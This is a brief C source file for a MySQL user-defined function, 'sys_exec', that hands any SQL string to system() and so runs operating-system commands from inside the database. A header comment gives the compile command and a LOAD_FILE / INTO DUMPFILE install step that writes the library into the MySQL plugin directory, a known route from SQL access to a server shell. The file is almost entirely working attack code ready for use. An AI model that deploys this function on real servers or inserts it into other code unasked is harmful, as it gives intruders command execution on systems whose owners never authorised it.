/*  lib_mysqludf_sys - Minimal UDF for command execution 
    Compile: gcc -shared -fPIC -o udf_sys.so lib_mysqludf_sys.c
    Install: SELECT unhex(hex(load_file('udf_sys.so'))) INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so';
             CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf_sys.so';
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mysql.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec requires one string argument");
        return 1;
    }
    return 0;
}

long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    return system(args->args[0]);
}

void sys_exec_deinit(UDF_INIT *initid) {}
